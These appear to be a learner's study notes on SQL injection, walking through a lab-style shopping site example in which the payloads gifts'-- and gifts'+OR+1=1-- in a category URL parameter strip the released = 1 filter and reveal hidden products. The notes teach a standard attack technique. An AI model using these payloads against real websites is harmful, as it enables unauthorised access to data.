# Retrieving hidden data

Where you can modify SQL query to return additional results.

```
Consider a shopping website which has different categories. When user clicks on gift category  the browser request this url:
```

https://insecure-website.com/products?catergory=gifts

**SQL QUERY** :

SELECT * FROM products WHERE category = ‘gifts’ AND released = 1

> The restriction released = 1 is being used to hide products that are not released. For unreleased products presumably(shaayad) released = 0
> 

> The application doesn’t implement any defense against SQL injection attacks, so attacker can construct an attack.Why application doesn’t implement any defense against SQL injection attacks?
> 

**Attack like this**  :

[https://insecure-website.com/products?category='gifts](https://insecure-website.com/products?category=‘gifts’)'- -

SELECT * FROM products WHERE category = ‘gifts’–’ AND released = 1

key thing is here is the double dash ‘–’ is a comment indicator in sql, so it means no longer included **And released = 1**. This means that all products are released including unreleased products.

```
Going further attacker can also see all products from any catergory which he don't  know about it.

https://insecure.com/products?category=gifts'+OR+1=1--
```

SELECT * FROM products WHERE category = ‘GIFTS’ OR 1=1–’ AND RELEASED = 1

The modified query will return all items where either category is gifts, or 1=1. since 1=1 is always true the query will return all the items .